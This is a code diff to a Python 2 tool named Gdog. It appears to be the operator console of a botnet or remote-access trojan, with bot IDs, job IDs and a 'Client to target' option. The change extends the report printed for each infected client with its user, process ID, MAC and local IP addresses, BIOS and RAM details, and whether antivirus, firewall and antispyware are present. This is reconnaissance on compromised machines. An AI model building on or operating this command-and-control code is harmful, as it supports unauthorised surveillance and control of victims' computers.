@@ -91,6 +91,7 @@ class InfoSecurity:
     
 infoSec = InfoSecurity()
 
+
 class MessageParser:
 
     def __init__(self, msg_data):
@@ -186,15 +187,27 @@ class Gdog:
 
             print "ID: " + botid
             print "DATE: '{}'".format(msg.date)
-            print "OS: " + msg.dict['os']
+            print "PID: " + str(msg.dict['pid'])
+            print "USER: " + str(msg.dict['user'])
+            print "OS: " + str(msg.dict['os'])
             print "ARCHITECTURE: " + str(msg.dict['arch'])
             print "CPU: " + str(msg.dict['cpu'])
             print "GPU: " + str(msg.dict['gpu'])
             print "MOTHERBOARD: " + str(msg.dict['motherboard'])  
             print "CHASSIS TYPE: " + str(msg.dict['chassistype'])
-            print "ADMIN: " + str(msg.dict['isAdmin']) 
+            print "ADMIN: " + str(msg.dict['isAdmin'])
+            print "TOTAL RAM: {}GB".format(str(msg.dict['totalram']))
+            print "BIOS: " + str(msg.dict['bios'])
+            print "MAC ADDRESS: " + str(msg.dict['mac'])
+            print "LOCAl IPv4 ADDRESS: " + str(msg.dict['ipv4'])
+            print "Antivirus: '{}'".format(msg.dict['av'])
+            print "Firewall: '{}'".format(msg.dict['firewall'])
+            print "Antispyware: '{}'".format(msg.dict['antispyware'])
+            print "TAG: " + str(msg.dict['tag'])
+            print "CLIENT VERSION: " + str(msg.dict['version'])
             print "FG WINDOWS: '{}'\n".format(msg.dict['fgwindow'])
-
+            
+            
     def getJobResults(self, botid, jobid):
 
         if (botid is None) or (jobid is None):
@@ -252,7 +265,7 @@ if __name__ == '__main__':
     
     parser.add_argument("-id", dest='id', type=str, default=None, help="Client to target")
     parser.add_argument('-jobid', dest='jobid', default=None, type=str, help='Job id to retrieve')
-    
+
     agroup = parser.add_argument_group()
     blogopts = agroup.add_mutually_exclusive_group()
     blogopts.add_argument("-list", dest="list", action="store_true", help="List available clients")
